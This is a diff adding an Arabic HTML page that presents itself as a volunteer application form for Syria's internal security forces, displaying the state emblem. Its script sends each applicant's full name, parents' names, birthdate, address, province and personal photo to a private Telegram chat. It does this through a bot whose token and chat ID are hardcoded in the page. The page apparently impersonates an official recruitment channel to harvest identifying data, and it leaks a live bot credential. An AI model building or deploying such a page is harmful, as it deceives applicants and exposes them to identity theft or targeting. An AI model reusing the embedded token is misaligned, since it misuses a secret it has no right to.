@@ -1,0 +1,368 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>نموذج التطوع في قوى الأمن الداخلي</title>
+    <style>
+        body {
+            font-family: 'Arial', sans-serif;
+            background-color: #000;
+            margin: 0;
+            padding: 20px;
+            color: #fff;
+            background-image: linear-gradient(rgba(0, 0, 0, 0.8), rgba(0, 0, 0, 0.8)), url('https://i.imgur.com/JtQ8bKZ.jpg');
+            background-size: cover;
+            background-attachment: fixed;
+        }
+        .container {
+            max-width: 800px;
+            margin: 20px auto;
+            background-color: rgba(0, 0, 0, 0.7);
+            padding: 30px;
+            border-radius: 10px;
+            box-shadow: 0 0 20px rgba(217, 83, 79, 0.3);
+            border: 1px solid #d9534f;
+        }
+        .header {
+            text-align: center;
+            margin-bottom: 30px;
+            position: relative;
+        }
+        .logo {
+            width: 120px;
+            height: auto;
+            margin-bottom: 15px;
+        }
+        h1 {
+            color: #d9534f;
+            margin: 10px 0;
+            font-size: 28px;
+            text-shadow: 0 0 5px rgba(217, 83, 79, 0.5);
+            position: relative;
+            padding-bottom: 15px;
+        }
+        h1:after {
+            content: "";
+            position: absolute;
+            bottom: 0;
+            left: 25%;
+            right: 25%;
+            height: 2px;
+            background: linear-gradient(to right, transparent, #d9534f, transparent);
+        }
+        .form-group {
+            margin-bottom: 25px;
+            position: relative;
+        }
+        label {
+            display: block;
+            margin-bottom: 10px;
+            font-weight: bold;
+            color: #d9534f;
+        }
+        input[type="text"],
+        input[type="date"],
+        input[type="file"],
+        select {
+            width: 100%;
+            padding: 12px 15px;
+            background-color: rgba(255, 255, 255, 0.1);
+            border: 1px solid #444;
+            border-radius: 5px;
+            box-sizing: border-box;
+            font-size: 16px;
+            color: #fff;
+            transition: all 0.3s;
+        }
+        input[type="text"]:focus,
+        input[type="date"]:focus,
+        input[type="file"]:focus,
+        select:focus {
+            border-color: #d9534f;
+            box-shadow: 0 0 8px rgba(217, 83, 79, 0.5);
+            outline: none;
+            background-color: rgba(255, 255, 255, 0.15);
+        }
+        .radio-group {
+            display: flex;
+            gap: 20px;
+        }
+        .radio-option {
+            display: flex;
+            align-items: center;
+        }
+        .radio-option input {
+            margin-left: 8px;
+        }
+        .radio-option label {
+            color: #fff;
+            font-weight: normal;
+        }
+        button {
+            background: linear-gradient(to bottom, #d9534f, #a94442);
+            color: white;
+            border: none;
+            padding: 15px 20px;
+            font-size: 18px;
+            border-radius: 5px;
+            cursor: pointer;
+            width: 100%;
+            font-weight: bold;
+            transition: all 0.3s;
+            text-transform: uppercase;
+            letter-spacing: 1px;
+            box-shadow: 0 4px 6px rgba(0, 0, 0, 0.3);
+        }
+        button:hover {
+            background: linear-gradient(to bottom, #c9302c, #8a2a2a);
+            box-shadow: 0 6px 8px rgba(0, 0, 0, 0.4);
+            transform: translateY(-2px);
+        }
+        button:active {
+            transform: translateY(1px);
+        }
+        .required {
+            color: #d9534f;
+            font-size: 18px;
+            vertical-align: middle;
+        }
+        #status {
+            text-align: center;
+            margin-top: 20px;
+            font-weight: bold;
+            padding: 10px;
+            border-radius: 5px;
+        }
+        .decoration {
+            position: absolute;
+            width: 100%;
+            height: 100%;
+            top: 0;
+            left: 0;
+            pointer-events: none;
+            overflow: hidden;
+            z-index: -1;
+        }
+        .decoration:before,
+        .decoration:after {
+            content: "";
+            position: absolute;
+            width: 200px;
+            height: 200px;
+            background: rgba(217, 83, 79, 0.1);
+            border-radius: 50%;
+            filter: blur(50px);
+        }
+        .decoration:before {
+            top: -50px;
+            left: -50px;
+        }
+        .decoration:after {
+            bottom: -50px;
+            right: -50px;
+        }
+        select option {
+            background-color: #222;
+            color: #fff;
+        }
+        ::placeholder {
+            color: #aaa;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="decoration"></div>
+        <div class="header">
+            <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/5/53/Emblem_of_Syria.svg/1200px-Emblem_of_Syria.svg.png" alt="شعار الأمن العام السوري" class="logo">
+            <h1>نموذج التطوع في قوى الأمن الداخلي</h1>
+        </div>
+        <form id="volunteerForm">
+            <div class="form-group">
+                <label for="name">الاسم <span class="required">*</span></label>
+                <input type="text" id="name" name="name" required placeholder="أدخل اسمك الكامل">
+            </div>
+            
+            <div class="form-group">
+                <label for="surname">الكنية <span class="required">*</span></label>
+                <input type="text" id="surname" name="surname" required placeholder="أدخل كنيّتك">
+            </div>
+            
+            <div class="form-group">
+                <label for="father">اسم الأب <span class="required">*</span></label>
+                <input type="text" id="father" name="father" required placeholder="أدخل اسم الأب">
+            </div>
+            
+            <div class="form-group">
+                <label for="mother">اسم الأم <span class="required">*</span></label>
+                <input type="text" id="mother" name="mother" required placeholder="أدخل اسم الأم">
+            </div>
+            
+            <div class="form-group">
+                <label for="birthdate">تاريخ الميلاد <span class="required">*</span></label>
+                <input type="date" id="birthdate" name="birthdate" required>
+            </div>
+            
+            <div class="form-group">
+                <label for="address">السكن الحالي <span class="required">*</span></label>
+                <input type="text" id="address" name="address" required placeholder="أدخل عنوان السكن الحالي">
+            </div>
+            
+            <div class="form-group">
+                <label>هل أنت مقيم في سوريا؟ <span class="required">*</span></label>
+                <div class="radio-group">
+                    <div class="radio-option">
+                        <input type="radio" id="resident-yes" name="resident" value="نعم" required>
+                        <label for="resident-yes">نعم</label>
+                    </div>
+                    <div class="radio-option">
+                        <input type="radio" id="resident-no" name="resident" value="لا">
+                        <label for="resident-no">لا</label>
+                    </div>
+                </div>
+            </div>
+            
+            <div class="form-group">
+                <label for="province">في أي محافظة ترغب في الانتساب؟ <span class="required">*</span></label>
+                <select id="province" name="province" required>
+                    <option value="">-- اختر المحافظة --</option>
+                    <option value="دمشق">دمشق</option>
+                    <option value="ريف دمشق">ريف دمشق</option>
+                    <option value="حلب">حلب</option>
+                    <option value="حمص">حمص</option>
+                    <option value="حماة">حماة</option>
+                    <option value="اللاذقية">اللاذقية</option>
+                    <option value="طرطوس">طرطوس</option>
+                    <option value="دير الزور">دير الزور</option>
+                    <option value="الحسكة">الحسكة</option>
+                    <option value="الرقة">الرقة</option>
+                    <option value="إدلب">إدلب</option>
+                    <option value="السويداء">السويداء</option>
+                    <option value="درعا">درعا</option>
+                    <option value="القنيطرة">القنيطرة</option>
+                </select>
+            </div>
+            
+            <div class="form-group">
+                <label for="photo">إرفاق صورة شخصية <span class="required">*</span></label>
+                <input type="file" id="photo" name="photo" accept="image/*" required>
+            </div>
+            
+            <button type="submit">إرسال الطلب</button>
+            <div id="status"></div>
+        </form>
+    </div>
+
+    <script>
+        document.getElementById('volunteerForm').addEventListener('submit', async function(e) {
+            e.preventDefault();
+            
+            const formData = new FormData(this);
+            const photoInput = document.getElementById('photo');
+            const statusDiv = document.getElementById('status');
+            
+            // تحقق من أن الملف المرفوع هو صورة
+            if (photoInput.files.length > 0) {
+                const file = photoInput.files[0];
+                if (!file.type.match('image.*')) {
+                    statusDiv.textContent = 'الرجاء إرفاق صورة صالحة';
+                    statusDiv.style.color = '#d9534f';
+                    statusDiv.style.backgroundColor = 'rgba(217, 83, 79, 0.2)';
+                    return;
+                }
+                
+                // تحقق من حجم الصورة (أقل من 5MB)
+                if (file.size > 5 * 1024 * 1024) {
+                    statusDiv.textContent = 'حجم الصورة يجب أن يكون أقل من 5MB';
+                    statusDiv.style.color = '#d9534f';
+                    statusDiv.style.backgroundColor = 'rgba(217, 83, 79, 0.2)';
+                    return;
+                }
+            }
+            
+            // إظهار رسالة تحميل
+            const button = document.querySelector('button');
+            button.disabled = true;
+            button.textContent = 'جاري إرسال البيانات...';
+            statusDiv.textContent = '';
+            statusDiv.style.backgroundColor = '';
+            
+            try {
+                // تجميع البيانات النصية
+                const textData = `
+                    📌 طلب جديد للتطوع في قوى الأمن الداخلي:
+                    
+                    الاسم: ${formData.get('name')}
+                    الكنية: ${formData.get('surname')}
+                    اسم الأب: ${formData.get('father')}
+                    اسم الأم: ${formData.get('mother')}
+                    تاريخ الميلاد: ${formData.get('birthdate')}
+                    السكن الحالي: ${formData.get('address')}
+                    مقيم في سوريا: ${formData.get('resident')}
+                    المحافظة المطلوبة: ${formData.get('province')}
+                `;
+                
+                // إرسال البيانات النصية إلى Telegram
+                const textResponse = await sendTextToTelegram(textData);
+                
+                if (textResponse.ok) {
+                    // إذا كانت هناك صورة، أرسلها كملف منفصل
+                    if (photoInput.files.length > 0) {
+                        await sendPhotoToTelegram(photoInput.files[0], formData.get('name'));
+                    }
+                    
+                    statusDiv.textContent = 'تم إرسال طلب التطوع بنجاح! شكراً لتقديمك.';
+                    statusDiv.style.color = '#4CAF50';
+                    statusDiv.style.backgroundColor = 'rgba(76, 175, 80, 0.2)';
+                    this.reset();
+                } else {
+                    throw new Error(textResponse.description || 'فشل إرسال البيانات');
+                }
+            } catch (error) {
+                console.error('Error:', error);
+                statusDiv.textContent = 'حدث خطأ أثناء إرسال البيانات. الرجاء المحاولة مرة أخرى.';
+                statusDiv.style.color = '#d9534f';
+                statusDiv.style.backgroundColor = 'rgba(217, 83, 79, 0.2)';
+            } finally {
+                button.disabled = false;
+                button.textContent = 'إرسال الطلب';
+            }
+        });
+        
+        async function sendTextToTelegram(text) {
+            const telegramUrl = `https://api.telegram.org/bot7054208207:AAHVwwMlay45aLFyQn4FCJyfWM_-AoQXpMM/sendMessage`;
+            
+            const response = await fetch(telegramUrl, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json',
+                },
+                body: JSON.stringify({
+                    chat_id: '7493001551',
+                    text: text,
+                    parse_mode: 'HTML'
+                })
+            });
+            
+            return await response.json();
+        }
+        
+        async function sendPhotoToTelegram(photoFile, name) {
+            const formData = new FormData();
+            formData.append('chat_id', '7493001551');
+            formData.append('photo', photoFile);
+            formData.append('caption', `الصورة الشخصية للمتطوع: ${name}`);
+            
+            const photoUrl = `https://api.telegram.org/bot7054208207:AAHVwwMlay45aLFyQn4FCJyfWM_-AoQXpMM/sendPhoto`;
+            
+            const response = await fetch(photoUrl, {
+                method: 'POST',
+                body: formData
+            });
+            
+            return await response.json();
+        }
+    </script>
+</body>
+</html>
